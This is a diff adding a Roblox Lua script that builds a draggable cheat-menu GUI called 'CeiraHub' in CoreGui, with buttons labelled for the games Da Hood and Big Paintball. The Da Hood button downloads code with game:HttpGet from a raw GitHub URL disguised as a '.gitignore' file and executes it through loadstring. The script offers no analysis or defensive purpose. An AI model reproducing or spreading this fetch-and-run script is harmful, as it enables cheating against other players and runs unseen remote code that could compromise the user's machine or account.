@@ -1,0 +1,71 @@
+
+
+local ScreenGui = Instance.new("ScreenGui")
+local CeiraHub = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local SFrame = Instance.new("ScrollingFrame")
+local DaHood = Instance.new("TextButton")
+local BigPaintBallCash = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+CeiraHub.Name = "CeiraHub"
+CeiraHub.Parent = ScreenGui
+CeiraHub.BackgroundColor3 = Color3.fromRGB(230, 41, 255)
+CeiraHub.Position = UDim2.new(0.636363685, 0, 0.156202152, 0)
+CeiraHub.Size = UDim2.new(0, 421, 0, 247)
+CeiraHub.Active = true
+CeiraHub.Draggable = true
+Title.Name = "Title"
+Title.Parent = CeiraHub
+Title.BackgroundColor3 = Color3.fromRGB(140, 140, 140)
+Title.Size = UDim2.new(0, 421, 0, 50)
+Title.Font = Enum.Font.IndieFlower
+Title.Text = "CeiraHub"
+Title.TextColor3 = Color3.fromRGB(0, 0, 0)
+Title.TextScaled = true
+Title.TextSize = 14.000
+Title.TextWrapped = true
+
+SFrame.Name = "SFrame"
+SFrame.Parent = CeiraHub
+SFrame.Active = true
+SFrame.BackgroundColor3 = Color3.fromRGB(230, 41, 255)
+SFrame.Position = UDim2.new(0, 0, 0.202429146, 0)
+SFrame.Size = UDim2.new(0, 421, 0, 197)
+
+DaHood.Name = "DaHood"
+DaHood.Parent = SFrame
+DaHood.BackgroundColor3 = Color3.fromRGB(140, 140, 140)
+DaHood.Position = UDim2.new(0, 0, 0.0155418254, 0)
+DaHood.Size = UDim2.new(0, 401, 0, 27)
+DaHood.Font = Enum.Font.IndieFlower
+DaHood.Text = "DaHood"
+DaHood.TextColor3 = Color3.fromRGB(0, 0, 0)
+DaHood.TextScaled = true
+DaHood.TextSize = 14.000
+DaHood.TextWrapped = true
+DaHood.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Vanis252/valiant/main/.gitignore',true))()
+	
+	CeiraHub.Destroy()
+end)
+
+BigPaintBallCash.Name = "BigPaintBallCash"
+BigPaintBallCash.Parent = SFrame
+BigPaintBallCash.BackgroundColor3 = Color3.fromRGB(140, 140, 140)
+BigPaintBallCash.Position = UDim2.new(0, 0, 0.0823434442, 0)
+BigPaintBallCash.Size = UDim2.new(0, 401, 0, 27)
+BigPaintBallCash.Font = Enum.Font.IndieFlower
+BigPaintBallCash.Text = "BigPaintballCash"
+BigPaintBallCash.TextColor3 = Color3.fromRGB(0, 0, 0)
+BigPaintBallCash.TextScaled = true
+BigPaintBallCash.TextSize = 14.000
+BigPaintBallCash.TextWrapped = true
+BigPaintBallCash.MouseButton1Down:connect(function()
+	BigPaintBallCash.Text = "Outdated COMING SOON!"
+	wait(1)
+	BigPaintBallCash.Text = "BigPaintballCash"
+end)
